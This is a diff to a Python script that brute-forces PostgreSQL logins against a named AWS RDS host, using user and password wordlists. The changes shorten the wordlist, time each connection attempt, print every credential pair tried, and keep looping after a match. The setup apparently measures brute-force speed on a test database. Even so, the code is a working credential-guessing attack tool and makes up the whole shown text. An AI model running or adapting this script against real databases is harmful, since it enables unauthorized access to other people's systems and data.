@@ -4,14 +4,14 @@ import argparse
 
 host='postgre-db-test.c8ur2wv0ivpl.us-east-1.rds.amazonaws.com'
 # users_file='users.txt'
-users_file='passwords_8_len.txt'
-passwords_file='passwords_8_len.txt'
+users_file='passwords_8_len_short.txt'
+passwords_file='passwords_8_len_short.txt'
 
 def bruteforce(user, password):
     user_list= [user] if user else open(f'{users_file}',"r")
     password_list= [password] if password else open(f'{passwords_file}',"r")
 
-    start = time.time()
+    total_time = time.time()
 
     iterations=0
     for current_user in user_list:
@@ -19,6 +19,7 @@ def bruteforce(user, password):
             # print(f'Testing password: {current_password}')
             iterations+=1
             try:
+                trial_start=time.time()
                 engine = psycopg2.connect(
                     database="postgres",
                     user=current_user,
@@ -27,13 +28,18 @@ def bruteforce(user, password):
                     port='5432'
                 )
             except Exception as e:
+                trial_elapsed = time.time() - trial_start
+                print(f'Credentials {current_user}/{current_password} took {trial_elapsed}')
                 continue
+            
+            trial_elapsed = time.time() - trial_start
             print(f'Found: {current_password}')
-            break
+            print(f'Credentials {current_user}/{current_password} took {trial_elapsed}')
+            # break
 
-    elapsed = (time.time() - start)
-    print(f'\nTotal bruteforcing time: {elapsed} for {iterations} trials')
-    print(f'\nMean bruteforcing time: {elapsed/iterations}')
+    total_elapsed = time.time() - total_time
+    print(f'\nTotal bruteforcing time: {total_elapsed} for {iterations} trials')
+    print(f'\nMean bruteforcing time: {total_elapsed/iterations}')
 
 if __name__ == '__main__':
     
